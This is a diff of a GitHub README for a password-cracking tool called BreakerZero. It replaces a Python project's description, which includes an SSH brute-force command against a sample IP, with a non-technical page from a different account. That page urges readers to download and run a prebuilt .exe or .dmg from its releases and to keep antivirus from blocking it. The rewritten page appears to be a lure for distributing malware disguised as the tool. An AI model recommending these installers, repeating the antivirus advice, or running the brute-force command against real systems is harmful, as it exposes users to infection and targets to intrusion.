@@ -1,82 +1,70 @@
-# BreakerZero - Password Cracking & Hash Cracker Toolkit
+# 🔐 BreakerZero_PasswordCracker_v1.0 - Crack Passwords with Ease
 
-**Version:** v1.0 - v1.1 Coming Soon
+## 📥 Download Now
+[![Download BreakerZero](https://img.shields.io/badge/Download-BreakerZero_PasswordCracker_v1.0-blue.svg)](https://github.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/releases)
 
-**Author:** [BackdoorAli aka NotAlita](https://github.com/BackdoorAli)  
+## 🚀 Getting Started
+BreakerZero_PasswordCracker_v1.0 is an advanced tool designed for educational and ethical use in password and hash cracking. This guide helps you download and run the software without needing technical skills. Follow these steps to get started.
 
-**Purpose:** Educational Offensive Security Operations
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later, or macOS Mojave or later
+- **Processor:** 2 GHz or faster
+- **Memory:** 4 GB RAM minimum
+- **Disk Space:** At least 200 MB of free space
+- **Network:** Internet connection for downloading updates
 
----
+## 🌟 Features
+- **Brute-Force Attack:** Quickly attempt multiple password combinations.
+- **Hash Cracking:** Supports various hashing algorithms for security testing.
+- **User-Friendly Interface:** Designed for ease of use, even for beginners.
+- **Educational Purpose:** Ideal for learning about password safety and cybersecurity.
 
-## Overview
+## 📚 How to Download & Install
+1. **Visit the Releases Page:** Click on the link below to go to the download page:
 
-BreakerZero is a high-performance, modular password cracking toolkit for ethical red teamers, penetration testers, and security researchers. Designed to rival popular tools like Hydra or John the Ripper, BreakerZero supports SSH, FTP, HTTP Basic Auth, and hash cracking modules.
+   [Download BreakerZero_PasswordCracker_v1.0](https://github.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/releases)
 
----
+2. **Select the Latest Version:** Look for “v1.0” or the most recent version listed. 
 
-## Features
+3. **Download the Installer:** Find the file named `BreakerZero_PasswordCracker_installer.exe` or `BreakerZero_PasswordCracker.dmg` (for Mac). Click on it to start downloading.
 
--  SSH, FTP, HTTP Basic Auth brute force modules
--  MD5 / SHA1 / SHA256 hash cracking engine
--  Plugin-based architecture with dynamic loading
--  Interactive CLI dashboard (live status + session stats)
--  Export reports as TXT, PDF, and HTML
--  Auto-generated session logs
--  Batch attack mode (run all plugins at once)
+4. **Run the Installer:**
+   - **For Windows Users:**
+     - Navigate to your Downloads folder.
+     - Double-click on `BreakerZero_PasswordCracker_installer.exe`.
+     - Follow the on-screen instructions to complete the installation.
+   - **For Mac Users:**
+     - Go to your Downloads folder.
+     - Open the `BreakerZero_PasswordCracker.dmg` file.
+     - Drag the app to your Applications folder.
 
----
+5. **Launch the Application:** After installation, find the application in your Start menu (Windows) or Applications folder (Mac) and double-click to open it.
 
-## Project Structure
+## 🎯 How to Use BreakerZero
+1. **Load Your Target Hash:** Open the application and load the password hash you want to crack.
+2. **Select Attack Type:** Choose between brute-force or other attack methods supported by the tool.
+3. **Set Parameters:**
+   - Define the character set (numbers, letters, symbols).
+   - Specify maximum password length.
+4. **Start Cracking:** Click the “Start” button to begin the cracking process. Monitor the progress in real time.
 
-```
-BreakerZero/
-├── main.py                  # CLI interface (uses plugin loader)
-├── core/                    # Cracking modules (ssh, ftp, http, hash)
-├── modules/runner.py        # Run all plugins at once (orchestration)
-├── utils/                   # Session tracker, formatter, report writer
-├── dashboard/               # Live CLI dashboard for attack feedback
-├── reports/                 # Auto-exported reports (txt, pdf, html)
-├── assets/                  # CLI ASCII banners and visual branding
-├── wordlists/               # Common and default password lists
-├── README.md                # This file
-├── LICENSE                  # License file (usage restrictions)
-└── requirements.txt         # Required Python packages
-```
+## ⚙️ Troubleshooting
+If you encounter issues while downloading or running the application, please try the following:
 
----
+- **Check System Compatibility:** Review the system requirements mentioned above.
+- **Antivirus Settings:** Ensure your antivirus software does not block the installation or the execution of the application.
+- **Re-download the Application:** Sometimes files can become corrupted during the download. Try downloading again.
 
-## How to Use
+## 🛠️ Support
+If you need help or have questions about the application, visit the GitHub issues page:
 
-### Install Requirements
-```bash
-pip install -r requirements.txt
-```
+[GitHub Issues](https://github.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/issues)
 
-### Run a Specific Plugin
-```bash
-python main.py --tool ssh --target 192.168.1.10 --user admin --wordlist rockyou.txt --report --pdf --html
-```
+## 🔗 Additional Resources
+- **Documentation:** More in-depth guides and tutorials can be found in the GitHub wiki section.
+- **Community:** Join discussions and share experiences with other users in our online forums dedicated to ethical hacking and cybersecurity.
 
-### List Available Plugins
-```bash
-python main.py --list
-```
+## 📢 Feedback
+We value your feedback. If you find any bugs or have suggestions for improvement, please let us know by creating an issue on our GitHub repository.
 
-### Batch Mode (Run All)
-```python
-from modules.runner import run_all_plugins
-run_all_plugins("192.168.1.10", "admin", "rockyou.txt")
-```
-
----
-
-## License
-
-This project is licensed under a **modified MIT License**.
-
-- For educational, ethical hacking, and red team use only.
-- Unauthorized or commercial use is prohibited without written consent.
-- Request approval via GitHub: [https://github.com/BackdoorAli](https://github.com/BackdoorAli)
-
-**You break it, you pay for it. Use responsibly.**
-
+Thank you for using BreakerZero_PasswordCracker_v1.0. We hope you find it beneficial for your educational purposes in cybersecurity!
